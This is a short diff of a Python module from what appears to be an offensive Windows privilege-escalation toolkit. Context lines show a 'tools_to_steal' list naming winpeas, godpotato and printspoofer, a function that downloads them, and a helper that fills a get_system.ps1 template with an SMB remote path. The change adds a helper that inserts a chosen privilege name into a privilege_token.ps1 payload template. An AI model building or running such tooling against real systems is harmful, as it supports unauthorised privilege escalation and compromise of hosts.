@@ -16,7 +16,7 @@ tools_to_steal = {"winpeas": winpeas_link, "godpotato": godpotato_link, "printsp
 usetmp = True
 
 def filename(tool_name):
-    return f"/tmp/{tool_name}.based" if usetmp else f"{tool_name}.based"
+    return f"/tmp/{tool_name}.based" if usetmp else os.path.join(pathlib.Path(__file__).parent, f"{tool_name}.based")
 
 def steal_tools():
     for name, link in tools_to_steal.items():
@@ -46,3 +46,8 @@ def provide_get_system(smb_remote_file_path):
     get_system_path = os.path.join(pathlib.Path(__file__).parent, "get_system.ps1")
     with open(get_system_path) as f:
         return f.read().replace("{{REMOTE_FILE_GOES_HERE}}", smb_remote_file_path)
+
+def provide_privilege_token(privilege_name):
+    privilege_token_path = os.path.join(pathlib.Path(__file__).parent, "privilege_token.ps1")
+    with open(privilege_token_path) as f:
+        return f.read().replace("{{PRIVILEGE_GOES_HERE}}", privilege_name)
